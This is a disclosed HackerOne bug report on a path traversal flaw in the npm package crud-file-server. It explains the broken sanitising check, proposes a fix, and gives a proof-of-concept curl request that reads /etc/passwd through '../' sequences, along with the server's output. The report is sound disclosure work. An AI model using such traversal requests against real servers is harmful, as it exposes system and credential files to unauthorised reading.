# [crud-file-server] Path Traversal allows to read arbitrary file from the server

## Report Details
- **Report ID**: 310690
- **URL**: https://hackerone.com/reports/310690
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-01-31T00:14:17.515Z
- **Disclosed**: 2018-04-03T23:04:07.517Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

There is Path Traversal vulnerability in crud-file-server module, which allows to read arbitrary file from the remote server.

## Module

**crud-file-server**

This package exposes a directory and its children to create, read, update, and delete operations over http.

https://www.npmjs.com/package/crud-file-server

version: 0.7.0

Stats
0 downloads in the last day
26 downloads in the last week
220 downloads in the last month

~2500 estimated downloads per year


## Description

This vulnerability is caused by simple mistake in function which should block Path Traversal attempts:


```javascript
// ./node_modules/crud-file-server/crud-file-server.js, line 4:
var cleanUrl = function(url) { 
	url = decodeURIComponent(url);
	while(url.indexOf('..').length > 0) { url = url.replace('..', ''); }
	return url;
};
```

As you can see, condition which checks existence of ```..``` is wrong, because ```url.indexOf()``` returns index of found string or -1 if nothing matches; and has no ```length``` property. Because of that, this condition is always false, thus ```url = url.replace('..', '');``` is never executed.

The correct condition should be:

```javascript
while(url.indexOf('..') > 0) { url = url.replace('..', ''); }
```

I've verified that this is enough to fix this vulnerability.


## Steps To Reproduce:

- install ```crud-file-server``` module

```
$ npm install crud-file-server
```

- run server from command line:

```
$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080
```

- use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
```

Result:

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Type: application/octet-stream
< Content-Length: 6774
< Date: Wed, 31 Jan 2018 00:01:31 GMT
< Connection: keep-alive
<
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico
_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false
(...)
```

After the patch described in **Description** is applied, the result of ```curl``` command is as expected:

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 500 Internal Server Error
< Content-Type: application/json
< Date: Wed, 31 Jan 2018 00:01:49 GMT
< Connection: keep-alive
< Content-Length: 71
<
* Connection #0 to host 127.0.0.1 left intact
{"errno":-2,"code":"ENOENT","syscall":"stat","path":"./////etc/passwd"}
```



## Supporting Material/References:

Configuration:

- macOS 10.13.3
- Chromium 66.0.3331.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.3
- npm version: 5.5.1
- curl 7.54.0


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows to read content of any file on the server.

## Attachments
No attachments
